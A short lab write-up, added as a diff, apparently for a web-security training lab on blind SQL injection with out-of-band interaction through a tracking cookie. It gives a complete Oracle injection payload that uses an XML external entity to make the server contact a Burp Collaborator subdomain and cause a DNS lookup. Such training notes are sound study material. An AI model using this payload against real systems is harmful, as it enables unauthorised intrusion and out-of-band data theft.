@@ -1,0 +1,12 @@
+Lab #15 Blind SQL injection with out-of-band interaction
+
+Vulnerable parameter - Tracking cookie
+
+End Goal: Exploit SQLi and cause a DNS lookup
+-------------------------------------------------------
+
+iqcyse3xiuwp97t9pshg2m9rlirbf13q.oastify.com => our burp collaborator subdomain.
+
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://iqcyse3xiuwp97t9pshg2m9rlirbf13q.oastify.com"> %remote;]>'),'/l') FROM dual)--
+
+=> by this query we'll get all the dns lookups using burp collaborator.
